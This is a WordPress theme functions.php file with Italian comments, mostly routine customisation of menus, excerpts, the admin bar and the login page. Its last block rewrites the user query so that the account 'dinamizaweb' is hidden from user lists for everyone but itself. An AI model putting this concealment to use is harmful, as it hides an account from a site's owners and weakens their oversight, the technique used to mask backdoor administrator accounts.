<?php

/*******************************************/
/*  CUSTOM MENU */
/*******************************************/
register_nav_menus( array(
    'primary' => __( 'Menu header', 'config' ),
    'footer' => __( 'Menu footer', 'config' ),
    'lingue' => __( 'Menu lingue', 'config' ),
) );


/*******************************************/
/*  REMOVE TAG */
/*******************************************/
function myprefix_unregister_tags() {
    unregister_taxonomy_for_object_type('post_tag', 'post');
}
add_action('init', 'myprefix_unregister_tags');



/*******************************************/
/*  ACF */
/*******************************************/
if( function_exists('acf_add_options_page') ) {

    acf_add_options_page(array(
        'page_title' 	=> 'Campi globali',
        'menu_title'	=> 'Campi globali',
        'menu_slug' 	=> 'theme-general-settings',
        'capability'	=> 'edit_posts',
        'redirect'		=> true
    ));

    acf_add_options_sub_page(array(
        'page_title' 	=> 'Google Maps - API',
        'menu_title'	=> 'Google Maps - API',
        'parent_slug'	=> 'theme-general-settings',
    ));

}



/********************************************************************/
/* lunghezza excerpt e testo more */
/********************************************************************/
function wpdocs_custom_excerpt_length( $length ) {
    return 20;
}
add_filter( 'excerpt_length', 'wpdocs_custom_excerpt_length', 999 );

function wpdocs_excerpt_more( $more ) {
    return '...';
}
add_filter( 'excerpt_more', 'wpdocs_excerpt_more' );



/********************************************************************/
/* rimuovo logo - commenti - nuovo - dalla barra di amministrazione */
/********************************************************************/
function annointed_admin_bar_remove() {

    global $wp_admin_bar;

    /* Remove their stuff */
    $wp_admin_bar->remove_menu('wp-logo');
    $wp_admin_bar->remove_menu('comments');
    // $wp_admin_bar->remove_menu('new-content');
}
add_action('wp_before_admin_bar_render', 'annointed_admin_bar_remove', 0);



/*******************************************/
/*  rimuovo la voce CF7 ( contact form 7 ) */
/*******************************************/
if (!(current_user_can('administrator'))) {
    function remove_wpcf7() {
        remove_menu_page( 'wpcf7' );
    }
    add_action('admin_menu', 'remove_wpcf7');
}

/*********************************/
/* Personalizzo il logo di login */
/*********************************/
function login_css() {
    wp_enqueue_style( 'login_css', get_template_directory_uri() . '/common/css/login.css' );
}
add_action('login_head', 'login_css');


add_filter('next_posts_link_attributes', 'posts_link_attributes_1');
add_filter('previous_posts_link_attributes', 'posts_link_attributes_2');

function posts_link_attributes_1() {
    return 'class="prev-post"';
}
function posts_link_attributes_2() {
    return 'class="next-post"';
}


//**HIDE USER
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
    global $current_user;
    $username = $current_user->user_login;

    //l'username di questo sito è dinamizaweb non fa visualizzare author

    if ($username != 'dinamizaweb') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1',
            "WHERE 1=1 AND {$wpdb->users}.user_login != 'dinamizaweb'",$user_search->query_where);
    }
}


?>